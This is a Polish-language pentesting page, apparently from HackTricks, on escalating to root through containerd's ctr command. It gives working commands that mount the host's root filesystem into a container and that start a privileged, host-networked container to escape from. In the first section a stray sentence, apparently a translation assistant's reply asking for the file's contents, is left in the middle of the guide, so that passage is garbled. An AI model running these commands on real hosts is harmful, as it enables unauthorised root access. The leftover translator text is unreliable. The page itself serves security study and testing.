# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

Przejdź do poniższego linku, aby dowiedzieć się **gdzie `containerd` i `ctr` mieszczą się w stosie kontenerów**:


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Jeśli na hoście znajduje się polecenie `ctr`:
```bash
which ctr
/usr/bin/ctr
```
Potrzebuję zawartości pliku, aby wypisać obrazy. Wklej proszę zawartość src/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.md lub podaj dostęp do pliku. Po otrzymaniu pliku wypiszę wszystkie obrazy i przetłumaczę tekst zgodnie z wytycznymi.
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
A następnie **uruchom jeden z tych obrazów, montując w nim katalog root hosta**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Uruchom privileged container i wydostań się z niego.\
Możesz uruchomić privileged container jako:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Następnie możesz użyć niektórych technik wymienionych na poniższej stronie, aby **escape from it abusing privileged capabilities**:


{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
